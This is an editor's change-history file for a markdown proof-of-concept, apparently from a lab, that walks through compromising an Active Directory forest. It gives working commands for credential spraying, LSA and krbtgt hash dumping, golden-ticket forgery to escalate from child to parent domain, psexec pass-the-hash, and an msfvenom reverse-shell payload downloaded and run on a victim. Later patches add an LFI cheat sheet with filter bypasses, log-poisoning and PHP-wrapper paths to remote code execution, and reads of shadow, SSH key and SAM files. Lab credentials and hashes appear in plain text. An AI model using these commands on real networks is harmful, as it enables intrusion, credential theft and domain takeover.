{
    "sourceFile": "projects/active-directory/POC (EN).md",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 18,
            "patches": [
                {
                    "date": 1751430738651,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1751430756739,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -269,7 +269,4 @@\n ```powershell\r\n Import-Module .\\PowerView.ps1\r\n ```\r\n \r\n----\r\n-\r\n-> This is the complete English version of the attack flow. The Indonesian version is available above.\r\n"
                },
                {
                    "date": 1751430764469,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -263,9 +263,9 @@\n * `payload.exe`\r\n * `mimikatz.exe`\r\n * `PowerView.ps1`\r\n \r\n-Import PowerView:\r\n+Import PowerView in vi:\r\n \r\n ```powershell\r\n Import-Module .\\PowerView.ps1\r\n ```\r\n"
                },
                {
                    "date": 1751430773163,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -263,9 +263,9 @@\n * `payload.exe`\r\n * `mimikatz.exe`\r\n * `PowerView.ps1`\r\n \r\n-Import PowerView in vi:\r\n+Import PowerView in powershell victim:\r\n \r\n ```powershell\r\n Import-Module .\\PowerView.ps1\r\n ```\r\n"
                },
                {
                    "date": 1751430778738,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -266,7 +266,8 @@\n \r\n Import PowerView in powershell victim:\r\n \r\n ```powershell\r\n+powershell\r\n Import-Module .\\PowerView.ps1\r\n ```\r\n \r\n"
                },
                {
                    "date": 1751430931813,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -9,9 +9,9 @@\n Port 80 is open ‚Äî access the web server via browser.\r\n \r\n ### 2. Web Vulnerability Enumeration\r\n \r\n-* **LFI**: `../../../etc/passwd`\r\n+* **LFI**: ````../../../etc/passwd`\r\n * **Directory Brute-force**:\r\n \r\n ```bash\r\n dirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n"
                },
                {
                    "date": 1751430937745,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -9,9 +9,9 @@\n Port 80 is open ‚Äî access the web server via browser.\r\n \r\n ### 2. Web Vulnerability Enumeration\r\n \r\n-* **LFI**: ````../../../etc/passwd`\r\n+* **LFI**: `../../../etc/passwd`\r\n * **Directory Brute-force**:\r\n \r\n ```bash\r\n dirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n"
                },
                {
                    "date": 1751430943133,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -9,9 +9,11 @@\n Port 80 is open ‚Äî access the web server via browser.\r\n \r\n ### 2. Web Vulnerability Enumeration\r\n \r\n-* **LFI**: `../../../etc/passwd`\r\n+* **LFI**: \r\n+\r\n+`../../../etc/passwd`\r\n * **Directory Brute-force**:\r\n \r\n ```bash\r\n dirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n"
                },
                {
                    "date": 1751430951899,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -11,9 +11,11 @@\n ### 2. Web Vulnerability Enumeration\r\n \r\n * **LFI**: \r\n \r\n-`../../../etc/passwd`\r\n+```bash\r\n+../../../etc/passwd`\r\n+\r\n * **Directory Brute-force**:\r\n \r\n ```bash\r\n dirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n"
                },
                {
                    "date": 1751430957304,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -12,9 +12,9 @@\n \r\n * **LFI**: \r\n \r\n ```bash\r\n-../../../etc/passwd`\r\n+../../../etc/passwd```\r\n \r\n * **Directory Brute-force**:\r\n \r\n ```bash\r\n"
                },
                {
                    "date": 1751430964008,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -12,9 +12,11 @@\n \r\n * **LFI**: \r\n \r\n ```bash\r\n-../../../etc/passwd```\r\n+http://192.168.80.10/index.php?page=../../../../../../../../windows/win.ini\r\n+http://192.168.80.10/index.php?page=../../../../../../../../var/log/apache2/access.log\r\n+```\r\n \r\n * **Directory Brute-force**:\r\n \r\n ```bash\r\n"
                },
                {
                    "date": 1751431101099,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -12,10 +12,47 @@\n \r\n * **LFI**: \r\n \r\n ```bash\r\n-http://192.168.80.10/index.php?page=../../../../../../../../windows/win.ini\r\n-http://192.168.80.10/index.php?page=../../../../../../../../var/log/apache2/access.log\r\n+# ‚úÖ Basic LFI Examples\r\n+curl \"http://target/index.php?page=../../../../etc/passwd\"\r\n+curl \"http://target/index.php?page=../../../../windows/win.ini\"\r\n+curl \"http://target/index.php?page=../../../../var/log/apache2/access.log\"\r\n+\r\n+# üîê Bypass Filters\r\n+curl \"http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd\"          # URL encoded\r\n+curl \"http://target/index.php?page=..%252f..%252fetc%252fpasswd\"        # Double encoded\r\n+curl \"http://target/index.php?page=../../../../etc/passwd%00\"           # Null byte (old PHP)\r\n+\r\n+# üêö LFI to RCE via Log Poisoning\r\n+# Step 1: Inject PHP via User-Agent header (access.log poisoning)\r\n+curl -A \"<?php system(\\$_GET['cmd']); ?>\" \"http://target/\"\r\n+# Step 2: Include poisoned log to execute\r\n+curl \"http://target/index.php?page=../../../../var/log/apache2/access.log&cmd=id\"\r\n+\r\n+# üßë‚Äçüíª Session Hijacking via LFI\r\n+curl \"http://target/index.php?page=/var/lib/php/sessions/sess_abcd1234\"\r\n+\r\n+# ‚ò†Ô∏è File Upload + LFI to RCE\r\n+# Upload image with embedded PHP code, then include it\r\n+curl \"http://target/index.php?page=../../uploads/shell.jpg&cmd=id\"\r\n+\r\n+# üåÄ PHP Wrappers (if allow_url_include=On)\r\n+curl \"http://target/index.php?page=php://filter/convert.base64-encode/resource=index.php\"\r\n+curl \"http://target/index.php?page=data:text/plain,<?php system(\\$_GET['cmd']); ?>&cmd=id\"\r\n+\r\n+# üìÅ Target Files (Linux/Windows)\r\n+curl \"http://target/index.php?page=/etc/passwd\"\r\n+curl \"http://target/index.php?page=/etc/shadow\"\r\n+curl \"http://target/index.php?page=/etc/hostname\"\r\n+curl \"http://target/index.php?page=/home/user/.ssh/id_rsa\"\r\n+curl \"http://target/index.php?page=C:/Windows/win.ini\"\r\n+curl \"http://target/index.php?page=C:/Windows/System32/config/SAM\"\r\n+\r\n+# üí° Note\r\n+# Use BurpSuite or curl -A/curl -b to manipulate headers/cookies for advanced injection.\r\n+# Combine with file write vulnerabilities to escalate LFI into RCE.\r\n+\r\n ```\r\n \r\n * **Directory Brute-force**:\r\n \r\n"
                },
                {
                    "date": 1751431110443,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -13,9 +13,9 @@\n * **LFI**: \r\n \r\n ```bash\r\n # ‚úÖ Basic LFI Examples\r\n-curl \"http://target/index.php?page=../../../../etc/passwd\"\r\n+http://target/index.php?page=../../../../etc/passwd\"\r\n curl \"http://target/index.php?page=../../../../windows/win.ini\"\r\n curl \"http://target/index.php?page=../../../../var/log/apache2/access.log\"\r\n \r\n # üîê Bypass Filters\r\n"
                },
                {
                    "date": 1751431115993,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -13,10 +13,10 @@\n * **LFI**: \r\n \r\n ```bash\r\n # ‚úÖ Basic LFI Examples\r\n-http://target/index.php?page=../../../../etc/passwd\"\r\n-curl \"http://target/index.php?page=../../../../windows/win.ini\"\r\n+http://target/index.php?page=../../../../etc/passwd\r\n+http://target/index.php?page=../../../../windows/win.ini\"\r\n curl \"http://target/index.php?page=../../../../var/log/apache2/access.log\"\r\n \r\n # üîê Bypass Filters\r\n curl \"http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd\"          # URL encoded\r\n"
                },
                {
                    "date": 1751431126524,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -14,10 +14,10 @@\n \r\n ```bash\r\n # ‚úÖ Basic LFI Examples\r\n http://target/index.php?page=../../../../etc/passwd\r\n-http://target/index.php?page=../../../../windows/win.ini\"\r\n-curl \"http://target/index.php?page=../../../../var/log/apache2/access.log\"\r\n+http://target/index.php?page=../../../../windows/win.ini\r\n+http://target/index.php?page=../../../../var/log/apache2/access.log\"\r\n \r\n # üîê Bypass Filters\r\n curl \"http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd\"          # URL encoded\r\n curl \"http://target/index.php?page=..%252f..%252fetc%252fpasswd\"        # Double encoded\r\n"
                },
                {
                    "date": 1751431136724,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -15,12 +15,12 @@\n ```bash\r\n # ‚úÖ Basic LFI Examples\r\n http://target/index.php?page=../../../../etc/passwd\r\n http://target/index.php?page=../../../../windows/win.ini\r\n-http://target/index.php?page=../../../../var/log/apache2/access.log\"\r\n+http://target/index.php?page=../../../../var/log/apache2/access.log\r\n \r\n # üîê Bypass Filters\r\n-curl \"http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd\"          # URL encoded\r\n+http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd\"          # URL encoded\r\n curl \"http://target/index.php?page=..%252f..%252fetc%252fpasswd\"        # Double encoded\r\n curl \"http://target/index.php?page=../../../../etc/passwd%00\"           # Null byte (old PHP)\r\n \r\n # üêö LFI to RCE via Log Poisoning\r\n"
                },
                {
                    "date": 1751431142223,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -18,9 +18,9 @@\n http://target/index.php?page=../../../../windows/win.ini\r\n http://target/index.php?page=../../../../var/log/apache2/access.log\r\n \r\n # üîê Bypass Filters\r\n-http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd\"          # URL encoded\r\n+http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd          # URL encoded\r\n curl \"http://target/index.php?page=..%252f..%252fetc%252fpasswd\"        # Double encoded\r\n curl \"http://target/index.php?page=../../../../etc/passwd%00\"           # Null byte (old PHP)\r\n \r\n # üêö LFI to RCE via Log Poisoning\r\n"
                },
                {
                    "date": 1751431159198,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -13,14 +13,14 @@\n * **LFI**: \r\n \r\n ```bash\r\n # ‚úÖ Basic LFI Examples\r\n-http://target/index.php?page=../../../../etc/passwd\r\n-http://target/index.php?page=../../../../windows/win.ini\r\n-http://target/index.php?page=../../../../var/log/apache2/access.log\r\n+curl \"http://target/index.php?page=../../../../etc/passwd\"\r\n+curl \"http://target/index.php?page=../../../../windows/win.ini\"\r\n+curl \"http://target/index.php?page=../../../../var/log/apache2/access.log\"\r\n \r\n # üîê Bypass Filters\r\n-http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd          # URL encoded\r\n+curl \"http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd\"          # URL encoded\r\n curl \"http://target/index.php?page=..%252f..%252fetc%252fpasswd\"        # Double encoded\r\n curl \"http://target/index.php?page=../../../../etc/passwd%00\"           # Null byte (old PHP)\r\n \r\n # üêö LFI to RCE via Log Poisoning\r\n"
                },
                {
                    "date": 1751431178686,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -47,12 +47,10 @@\n curl \"http://target/index.php?page=/home/user/.ssh/id_rsa\"\r\n curl \"http://target/index.php?page=C:/Windows/win.ini\"\r\n curl \"http://target/index.php?page=C:/Windows/System32/config/SAM\"\r\n \r\n-# üí° Note\r\n-# Use BurpSuite or curl -A/curl -b to manipulate headers/cookies for advanced injection.\r\n-# Combine with file write vulnerabilities to escalate LFI into RCE.\r\n \r\n+\r\n ```\r\n \r\n * **Directory Brute-force**:\r\n \r\n"
                }
            ],
            "date": 1751430738651,
            "name": "Commit-0",
            "content": "## Full Documentation: Privilege Escalation and Pivoting in Active Directory (EN)\r\n\r\n### 1. Network and Port Scanning with Nmap\r\n\r\n```bash\r\nnmap -sV 192.168.80.10\r\n```\r\n\r\nPort 80 is open ‚Äî access the web server via browser.\r\n\r\n### 2. Web Vulnerability Enumeration\r\n\r\n* **LFI**: `../../../etc/passwd`\r\n* **Directory Brute-force**:\r\n\r\n```bash\r\ndirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\nferoxbuster -u http://192.168.80.10 -w /home/miquela/wordlist/medium.txt\r\ngobuster dir -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n```\r\n\r\nGoal: find sensitive info such as admin credentials.\r\n\r\n### 3. Log into Web Server via SSH\r\n\r\n```bash\r\nssh privilege@192.168.80.10\r\n```\r\n\r\n### 4. Post-Access Enumeration\r\n\r\n```bash\r\nwhoami\r\nhostname\r\nid\r\nsudo -l\r\nsudo id\r\n```\r\n\r\n### 5. Check Network Info\r\n\r\n```bash\r\nifconfig\r\nip a\r\nip r\r\nroute -n\r\nnetstat\r\n```\r\n\r\n### 6. Searching for Sensitive Files\r\n\r\n```bash\r\nsudo grep -Rni \"free string\" / 2>/dev/null\r\ngrep -Ril \"free string\" / 2>/dev/null\r\nfind / -type f -iname \"free_string\" 2>/dev/null\r\n```\r\n\r\nExample: `places.sqlite`\r\n\r\n```bash\r\ncd ~/.mozilla/firefox/<profile-folder>\r\nsqlite3 places.sqlite\r\n.tables\r\nselect * from moz_bookmarks;\r\n```\r\n\r\nFound link: `http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6`\r\n\r\n### 7. Set Up Tunnel Using Ligolo-ng\r\n\r\n**Attacker:**\r\n\r\n```bash\r\nsudo ip tuntap add user $USER mode tun ligolo\r\nsudo ip link set ligolo up\r\nligolo-proxy -selfcert\r\n```\r\n\r\n**Pivot Machine:**\r\n\r\n```bash\r\nwget http://10.10.200.23:8000/agent\r\nchmod +x agent\r\n./agent -connect 10.10.200.23:11601 -ignore-cert\r\n```\r\n\r\n**Attacker:**\r\n\r\n```bash\r\nstart\r\nlistener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444\r\nsudo ip route add 192.168.98.0/24 dev ligolo\r\n```\r\n\r\n### 8. Enumerate Internal Network\r\n\r\n```bash\r\nnmap -sn 192.168.98.0/24\r\nping 192.168.98.2\r\ncat target.txt\r\n192.168.98.2\r\n192.168.98.15\r\n192.168.98.30\r\n192.168.98.120\r\n```\r\n\r\n### 9. Credential Spray with CME & LSA Dump\r\n\r\n```bash\r\ncrackmapexec smb target.txt -u john -p 'User1@#$%6'\r\ncrackmapexec smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa\r\n```\r\n\r\nRepeat with other credentials:\r\n\r\n```bash\r\ncrackmapexec smb target.txt -u corpmngr -p 'User4&*&*'\r\n```\r\n\r\n### 10. Add to /etc/hosts\r\n\r\n```bash\r\n192.168.98.2 warfare.corp dc01.warfare.corp\r\n192.168.98.120 child.warfare.corp cdc.child.warfare.corp\r\n```\r\n\r\n### 11. Dump krbtgt Hash\r\n\r\n```bash\r\nsecretsdump.py -debug child/corpmngr@192.168.98.120 -hashes :4cb3933610b827a281ec479031128cc6 -just-dc-user 'child\\krbtgt'\r\n```\r\n\r\nOr:\r\n\r\n```bash\r\nsecretsdump.py -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\\krbtgt'\r\n```\r\n\r\n### 12. Get Domain SIDs\r\n\r\n```bash\r\nlookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp\r\nlookupsid.py child/corpmngr:'User4&*&*'@warfare.corp\r\n```\r\n\r\n### 13. Golden Ticket Attack\r\n\r\n```bash\r\nimpacket-ticketer -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 \\\r\n-domain child.warfare.corp \\\r\n-domain-sid S-1-5-21-3754860944-83624914-1883974761 \\\r\n-extra-sid S-1-5-21-3375883379-808943238-3239386119-519 Administrator\r\nexport KRB5CCNAME=Administrator.ccache\r\n```\r\n\r\n### 14. Time Synchronization\r\n\r\n```bash\r\nsudo apt install ntpsec-ntpdate -y\r\nsudo ntpdig -S 192.168.98.2\r\n```\r\n\r\n### 15. Request Service Ticket & Dump Hash\r\n\r\n```bash\r\ngetST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/Administrator\r\nexport KRB5CCNAME=Administrator@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache\r\nsecretsdump.py -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\\Administrator'\r\n```\r\n\r\n### 16. Access Parent Domain Controller\r\n\r\n```bash\r\npsexec.py child.warfare.corp/Administrator@dc01.warfare.corp -k -no-pass -target-ip 192.168.98.2\r\n```\r\n\r\nOr using hash:\r\n\r\n```bash\r\npsexec.py -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:c20a43b71503528c05c57fcbff0c78e3\r\n```\r\n\r\n---\r\n\r\n## Persistence Techniques\r\n\r\n### Upload Payload\r\n\r\n```bash\r\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.98.15 lport=1234 -f exe -o rev.exe\r\n```\r\n\r\n### On Pivot Machine\r\n\r\n```bash\r\nssh privilege@192.168.80.10\r\n./agent -connect 10.10.200.23:11601 -ignore-cert\r\n```\r\n\r\n### On Attacker:\r\n\r\n```bash\r\nligolo-proxy -selfcert\r\nstart\r\nlistener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4321\r\n```\r\n\r\n### Upload to Victim\r\n\r\n```powershell\r\npowershell\r\nInvoke-WebRequest http://192.168.98.15:1237/payloads.exe -OutFile C:\\Users\\corpmngr\\Downloads\\payloads.exe\r\ncd C:\\Users\\corpmngr\\Downloads\r\n```\r\n\r\n### Start Handler on Kali\r\n\r\n```bash\r\nmsfconsole\r\nuse exploit/multi/handler\r\nset lhost 0.0.0.0\r\nset lport 4321\r\nset payload windows/x64/meterpreter/reverse_tcp\r\nrun\r\n```\r\n\r\n### Execute Payload on Victim\r\n\r\n```powershell\r\n.\\payloads.exe\r\n```\r\n\r\n---\r\n\r\n### Lateral Movement & Privilege Escalation to Parent\r\n\r\n1. Extract credentials using `creds_all` (meterpreter / kiwi).\r\n2. Get DC info:\r\n\r\n```powershell\r\nGet-ADDomainController -Server child.warfare.corp\r\nGet-ADForest\r\n```\r\n\r\n3. Get SID for child/parent:\r\n\r\n```powershell\r\nGet-DomainSID -Domain child.warfare.corp\r\nGet-DomainSID -Domain warfare.corp\r\n```\r\n\r\n4. Golden Ticket using ticketer:\r\n\r\n```bash\r\nimpacket-ticketer -aesKey <AESKEY> -domain child.warfare.corp -domain-sid <CHILD_SID> -extra-sid <PARENT_SID>-519 Administrator\r\n```\r\n\r\n---\r\n\r\n### Required Tools to Upload to Victim:\r\n\r\n* `agent`\r\n* `payload.exe`\r\n* `mimikatz.exe`\r\n* `PowerView.ps1`\r\n\r\nImport PowerView:\r\n\r\n```powershell\r\nImport-Module .\\PowerView.ps1\r\n```\r\n\r\n---\r\n\r\n> This is the complete English version of the attack flow. The Indonesian version is available above.\r\n"
        }
    ]
}